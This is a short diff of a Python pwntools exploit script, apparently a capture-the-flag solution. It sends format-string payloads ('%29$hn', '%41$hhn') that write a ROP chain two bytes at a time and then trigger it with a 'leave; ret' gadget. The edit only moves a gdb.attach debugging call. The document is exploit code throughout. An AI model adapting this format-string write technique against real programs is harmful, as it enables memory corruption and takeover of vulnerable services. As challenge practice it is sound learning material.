@@ -91,7 +91,7 @@ for i in range(0, len(payload), 2):
         payload2 += f"%{next_write}c"
     payload2 += f"%29$hn"  # Point to where we want to write
     p.recvuntil(b"begin your challenge\n")
-    gdb.attach(p, s)
+    
     p.send(payload2.encode())
     
     # Now write the actual 2 bytes of our ROP chain
@@ -105,6 +105,7 @@ for i in range(0, len(payload), 2):
     p.send(payload2.encode())
 
 # Step 7: Trigger our ROP chain with a 'leave; ret' gadget (0x9)
+gdb.attach(p, s)
 payload2 = f"%{0x9}c%41$hhnXXXXX\0"  # XXXXX as a marker to know when our input is done
 p.recvuntil(b"begin your challenge\n")
 p.send(payload2.encode())
